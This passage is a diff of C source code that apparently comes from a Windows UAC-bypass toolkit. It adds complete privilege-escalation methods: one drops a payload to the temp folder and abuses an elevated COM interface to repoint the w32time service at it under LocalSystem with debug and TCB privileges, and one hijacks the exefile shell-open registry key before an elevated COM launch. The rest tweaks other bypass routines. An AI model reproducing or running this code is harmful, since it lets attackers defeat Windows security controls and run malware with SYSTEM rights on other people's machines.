-            &xIID_IColorDataProxy,
             &ColorDataProxy);
 
+
         if (r != S_OK) {
-            supDebugPrint(L"ucmMasqueradedCoGetObjectElevate(ColorDataProxy)", r);
             break;
         }
 
         if (ColorDataProxy == NULL) {
-            r = E_FAIL;
+            r = E_OUTOFMEMORY;
             break;
         }
 
@@ -2258,6 +2259,9 @@ BOOL ucmDccwCOMMethod(
     if (ColorDataProxy != NULL) {
         ColorDataProxy->lpVtbl->Release(ColorDataProxy);
     }
+
+    if (hr_init == S_OK)
+        CoUninitialize();
 
     return SUCCEEDED(r);
 }
@@ -2346,9 +2350,9 @@ BOOL ucmBitlockerRCMethod(
             // Resume target application.
             //
             NtResumeProcess(shinfo.hProcess);
-            WaitForSingleObject(shinfo.hProcess, 5000);
+            if (WaitForSingleObject(shinfo.hProcess, 5000) == WAIT_TIMEOUT)
+                NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
 
-            NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
             NtClose(shinfo.hProcess);
             if (bNeedCleanup) {
                 RegDeleteValue(hKey, TEXT(""));
@@ -2377,6 +2381,8 @@ BOOL ucmBitlockerRCMethod(
 * Bypass UAC using fake COM class handler.
 * https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-bypass-UAC/
 * https://offsec.provadys.com/UAC-bypass-dotnet.html
+*
+* Produced mixed results since Windows 10 RS4.
 *
 */
 BOOL ucmCOMHandlersMethod2(
@@ -2582,7 +2588,7 @@ BOOL ucmCOMHandlersMethod2(
     if (bNeedCleanup) {
         _strcpy(szKey, T_REG_SOFTWARECLASSESCLSID);
         _strcat(szKey, T_MMCFrameworkSnapInFactory);
-        supDeleteKeyRecursive(HKEY_CURRENT_USER, szKey);
+        supRegDeleteKeyRecursive(HKEY_CURRENT_USER, szKey);
     }
     if (bRemoveFile) {
         _strcpy(szBuffer, g_ctx.szTempDirectory);
@@ -2591,4 +2597,474 @@ BOOL ucmCOMHandlersMethod2(
     }
 
     return bResult;
+}
+
+/*
+* ucmxSetResetW32TimeSvcParams
+*
+* Purpose:
+*
+* Set or reset to original w32time service params.
+*
+*/
+BOOL ucmxSetResetW32TimeSvcParams(
+    _In_ ISLLUACOM *SPLuaObject,
+    _In_opt_ LPWSTR lpServiceDll,
+    _In_ BOOL Set
+)
+{
+    HRESULT                 hr;
+
+    PWSTR                   Ptr;
+
+    PWSTR                   RequiredPrivileges =
+        L"SeAssignPrimaryTokenPrivilege\0SeImpersonatePrivilege\0SeDebugPrivilege\0SeTcbPrivilege\0\0";
+
+    PWSTR                   RequiredPrivilegesDefault =
+        L"SeAuditPrivilege\0SeChangeNotifyPrivilege\0SeCreateGlobalPrivilege\0SeSystemTimePrivilege\0\0";
+
+    PWSTR                   PrivSet, pServiceDll, pImagePath;
+
+    ULONG                   DataSize, Length, ServiceType;
+
+    WCHAR                   szLocal[MAX_PATH], szServiceDll[MAX_PATH];
+
+    RtlSecureZeroMemory(szLocal, sizeof(szLocal));
+    RtlSecureZeroMemory(szServiceDll, sizeof(szServiceDll));
+
+    if (Set) {
+        pServiceDll = lpServiceDll;
+        PrivSet = RequiredPrivileges;
+        _strcpy(szLocal, OBJECT_LOCALSYSTEM);
+    }
+    else {
+        _strcpy(szServiceDll, L"%systemroot%\\system32\\w32time.dll");
+        pServiceDll = szServiceDll;
+        PrivSet = RequiredPrivilegesDefault;
+        _strcpy(szLocal, OBJECT_LOCALSERVICE);
+    }
+
+    //
+    // Set RequiredPrivileges.
+    //
+    Ptr = PrivSet;
+    DataSize = 0;
+
+    while (*Ptr) {
+        Length = (ULONG)_strlen(Ptr) + 1;
+        Ptr = Ptr + Length;
+        DataSize += Length;
+    }
+
+    DataSize = (DataSize * sizeof(WCHAR)) + sizeof(UNICODE_NULL);
+    hr = ucmSPLUAObjectRegSetValue(
+        SPLuaObject,
+        SSLUA_HKEY_LOCAL_MACHINE,
+        W32TIME_SERVICE_PATH,
+        SVC_REQ_PRIVS,
+        REG_MULTI_SZ,
+        PrivSet,
+        DataSize);
+
+    if (SUCCEEDED(hr)) {
+
+        //
+        // Set ObjectName. 
+        //  
+        DataSize = ((ULONG)_strlen(szLocal) * sizeof(WCHAR)) + sizeof(UNICODE_NULL);
+        hr = ucmSPLUAObjectRegSetValue(
+            SPLuaObject,
+            SSLUA_HKEY_LOCAL_MACHINE,
+            W32TIME_SERVICE_PATH,
+            SVC_OBJECT_NAME,
+            REG_SZ,
+            szLocal,
+            DataSize);
+
+        if (SUCCEEDED(hr)) {
+
+            //
+            // Set ServiceDll.
+            //
+            if (g_ctx.dwBuildNumber >= 10240) {
+                DataSize = ((ULONG)_strlen(pServiceDll) * sizeof(WCHAR)) + sizeof(UNICODE_NULL);
+                hr = ucmSPLUAObjectRegSetValue(
+                    SPLuaObject,
+                    SSLUA_HKEY_LOCAL_MACHINE,
+                    W32TIME_SERVICE_PARAMETERS,
+                    SVC_SERVICE_DLL,
+                    REG_EXPAND_SZ,
+                    pServiceDll,
+                    DataSize);
+
+            }
+        }
+    }
+
+    //
+    // Running in EXE mode.
+    //
+    if (g_ctx.dwBuildNumber <= 9600) {
+
+        if (Set) {
+            ServiceType = SERVICE_WIN32_OWN_PROCESS;
+            pImagePath = pServiceDll;
+        }
+        else {
+            ServiceType = SERVICE_WIN32_SHARE_PROCESS;
+            pImagePath = L"%SystemRoot%\\system32\\svchost.exe -k LocalService";
+        }
+
+        //
+        // Set service type.
+        //
+       
+        DataSize = sizeof(ULONG);
+        
+        hr = ucmSPLUAObjectRegSetValue(
+            SPLuaObject,
+            SSLUA_HKEY_LOCAL_MACHINE,
+            W32TIME_SERVICE_PATH,
+            SVC_TYPE,
+            REG_DWORD,
+            (PVOID)&ServiceType,
+            DataSize);
+
+        if (SUCCEEDED(hr)) {
+
+            //
+            // Set service imagepath.
+            //
+            DataSize = ((ULONG)_strlen(pImagePath) * sizeof(WCHAR)) + sizeof(UNICODE_NULL);
+            hr = ucmSPLUAObjectRegSetValue(
+                SPLuaObject,
+                SSLUA_HKEY_LOCAL_MACHINE,
+                W32TIME_SERVICE_PATH,
+                SVC_IMAGE_PATH,
+                REG_EXPAND_SZ,
+                pImagePath,
+                DataSize);
+        }
+    }
+
+    return SUCCEEDED(hr);
+}
+
+/*
+* ucmxTrackService
+*
+* Purpose:
+*
+* Track service state.
+*
+*/
+DWORD ucmxTrackService()
+{
+    SC_HANDLE schManager, schService;
+
+    SERVICE_STATUS_PROCESS Status;
+
+    ULONG dummy, svcstate = 0;
+
+    schManager = OpenSCManager(
+        NULL, 
+        NULL, 
+        SC_MANAGER_CONNECT);
+
+    if (schManager) {
+
+        schService = OpenService(
+            schManager, 
+            W32TIME_SERVICE_NAME, 
+            SERVICE_QUERY_STATUS);
+
+        if (schService) {
+
+            if (QueryServiceStatusEx(
+                schService,
+                SC_STATUS_PROCESS_INFO,
+                (LPBYTE)&Status,
+                sizeof(Status),
+                &dummy)) 
+            {
+                svcstate = Status.dwCurrentState;
+            }
+
+            CloseServiceHandle(schService);
+        }
+        CloseServiceHandle(schManager);
+    }
+
+    return svcstate;
+}
+
+/*
+* ucmDateTimeStateWriterMethod
+*
+* Purpose:
+*
+* Exploit IDateTimeStateWriter undocumented COM interface which allows
+* elevated start/stop control over w32time service.
+*
+* Used in with deroko method which provide elevated RegSetValueEx functionality.
+*
+*/
+BOOL ucmDateTimeStateWriterMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    BOOL                    bCond = FALSE, bResult = FALSE;
+    ULONG                   I, svcstate;
+    HRESULT                 hr, hr_init;
+    HANDLE                  hSvcStopEvent = NULL;
+    IDateTimeStateWriter   *Dtsw = NULL;
+    ISLLUACOM              *SPLuaObject = NULL;
+
+    UNICODE_STRING          usSignalEvent = RTL_CONSTANT_STRING(SIGNAL_OBJECT);
+
+    OBJECT_ATTRIBUTES       obja;
+
+    LARGE_INTEGER           liDueTime;
+
+    WCHAR                   szServiceBinary[MAX_PATH * 2];
+
+    RtlSecureZeroMemory(szServiceBinary, sizeof(szServiceBinary));
+
+    //
+    // Drop payload to %temp%.
+    //
+    if (g_ctx.dwBuildNumber >= 10240) {
+        _strcpy(szServiceBinary, g_ctx.szTempDirectory);
+        _strcat(szServiceBinary, W32TIME_DLL);
+        if (!supWriteBufferToFile(szServiceBinary, ProxyDll, ProxyDllSize))
+            return bResult;
+    }
+    else {
+
+        if (supConvertDllToExeSetNewEP(
+            ProxyDll,
+            ProxyDllSize,
+            CHIYODA_EXT_ENTRYPOINT) == FALSE)
+        {
+            return bResult;
+        }
+
+        _strcpy(szServiceBinary, g_ctx.szTempDirectory);
+        _strcat(szServiceBinary, MYSTERIOUSCUTETHING);
+        _strcat(szServiceBinary, L".exe");
+        if (!supWriteBufferToFile(szServiceBinary, ProxyDll, ProxyDllSize))
+            return bResult;
+    }
+
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
+    //
+    // Setup IPC link for Chiyoda.
+    //
+    supSetupIPCLinkData();
+
+    do {
+
+        //
+        // Create ping back notification event in nonsignaled state.
+        //
+        InitializeObjectAttributes(&obja, &usSignalEvent, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+        if (!NT_SUCCESS(NtCreateEvent(
+            &hSvcStopEvent,
+            EVENT_ALL_ACCESS,
+            &obja,
+            NotificationEvent,
+            FALSE)))
+        {
+            break;
+        }
+
+        //
+        // Allocate SPLuaObject.
+        //
+        hr = ucmAllocateElevatedObject(
+            T_CLSID_SPPLUAObject,
+            &IID_ISPPLUAObject,
+            CLSCTX_LOCAL_SERVER,
+            &SPLuaObject);
+
+        if (hr != S_OK)
+            break;
+
+        //
+        // Allocate DateTimeStateWriter.
+        //
+        hr = ucmAllocateElevatedObject(
+            T_CLSID_DateTimeStateWriter,
+            &IID_DateTimeStateWriter,
+            CLSCTX_LOCAL_SERVER,
+            &Dtsw);
+
+        if (hr != S_OK)
+            break;
+
+        //
+        // Stop and Disable w32time.
+        //
+        hr = Dtsw->lpVtbl->StopAndDisableService(Dtsw);
+        if (hr != S_OK)
+            break;
+
+        Sleep(1000);
+
+        if (!ucmxSetResetW32TimeSvcParams(
+            SPLuaObject,
+            szServiceBinary,
+            TRUE))
+        {
+            break;
+        }
+
+        I = 5;
+
+        do {
+            supDbgMsg(L"app>>svc start try");
+
+            hr = Dtsw->lpVtbl->StartServiceAndRefresh(Dtsw, 0);
+            if (hr != S_OK)
+                break;
+
+            svcstate = ucmxTrackService();
+
+            if ((svcstate == SERVICE_RUNNING) ||
+                (svcstate == SERVICE_START_PENDING))
+            {
+                supDbgMsg(L"app>>started");
+                break;
+            }
+
+            Sleep(1000);
+            --I;
+
+        } while (I);
+       
+        if (FAILED(hr)) {
+            supDbgMsg(L"app>>StartServiceAndRefresh failed");
+            ucmxSetResetW32TimeSvcParams(SPLuaObject, NULL, FALSE);
+            break;
+        }
+
+        //
+        // Wait some time for ping back.
+        // We can't exit without ping back because:
+        // - IPC link will be destroyed
+        //   - Payload cannot normally run
+        //       
+        supDbgMsg(L"app>>waiting for an event\r\n");
+        liDueTime.QuadPart = -(LONGLONG)UInt32x32To64(20000, 10000);
+        NtWaitForSingleObject(hSvcStopEvent, FALSE, &liDueTime);
+        supDbgMsg(L"app>>wait complete\r\n");
+
+    } while (bCond);
+
+    if (hSvcStopEvent)
+        NtClose(hSvcStopEvent);
+
+    if (SPLuaObject)
+        SPLuaObject->lpVtbl->Release(SPLuaObject);
+
+    if (Dtsw)
+        Dtsw->lpVtbl->Release(Dtsw);
+
+    if (hr_init == S_OK)
+        CoUninitialize();
+
+    DeleteFile(szServiceBinary);
+
+    return bResult;
+}
+
+/*
+* ucmAcCplAdminMethod
+*
+* Purpose:
+*
+* Bypass UAC using registry HKCU\Software\Classes\exefile\shell\open hijack and AccessibilityCplAdmin elevated launch.
+*
+* Fixed in Windows 10 RS4
+*
+*/
+BOOL ucmAcCplAdminMethod(
+    _In_ LPWSTR lpszPayload
+)
+{
+    BOOL                    bValueSet = FALSE;
+    IAccessibilityCplAdmin *AdminElevate = NULL;
+    HRESULT                 hr = E_FAIL, hr_init;
+    HKEY                    hKey = NULL;
+    DWORD                   cbData = 0, dwDisposition = 0;
+    WCHAR                   szKeyName[MAX_PATH];
+
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
+    _strcpy(szKeyName, T_EXEFILE_SHELL);
+    _strcat(szKeyName, T_SHELL_OPEN_COMMAND);
+
+    hr = ucmAllocateElevatedObject(
+        T_CLSID_AcCplAdmin,
+        &IID_IAccessibilityCplAdmin,
+        CLSCTX_LOCAL_SERVER,
+        &AdminElevate);
+
+    if (SUCCEEDED(hr)) {
+
+        if (ERROR_SUCCESS == RegCreateKeyEx(
+            HKEY_CURRENT_USER,
+            szKeyName,
+            0,
+            NULL,
+            REG_OPTION_NON_VOLATILE,
+            MAXIMUM_ALLOWED,
+            NULL,
+            &hKey,
+            &dwDisposition))
+        {
+            cbData = (DWORD)((1 + _strlen(lpszPayload)) * sizeof(WCHAR));
+
+            if (ERROR_SUCCESS == RegSetValueEx(
+                hKey,
+                TEXT(""),
+                0, REG_SZ,
+                (BYTE*)lpszPayload,
+                cbData))
+            {
+                RegFlushKey(hKey);
+                RegCloseKey(hKey);
+
+                bValueSet = TRUE;
+
+                hr = AdminElevate->lpVtbl->LinktoSystemRestorePoint(AdminElevate);
+            }
+            else {
+                RegCloseKey(hKey);
+            }
+        }
+        AdminElevate->lpVtbl->Release(AdminElevate);
+    }
+
+    if (dwDisposition == REG_CREATED_NEW_KEY) {
+        supRegDeleteKeyRecursive(
+            HKEY_CURRENT_USER,
+            T_EXEFILE_SHELL);
+    }
+    else {
+        if (bValueSet) {
+            supDeleteKeyValueAndFlushKey(
+                HKEY_CURRENT_USER,
+                szKeyName,
+                TEXT(""));
+        }
+    }
+
+    if (hr_init == S_OK)
+        CoUninitialize();
+
+    return SUCCEEDED(hr);
 }
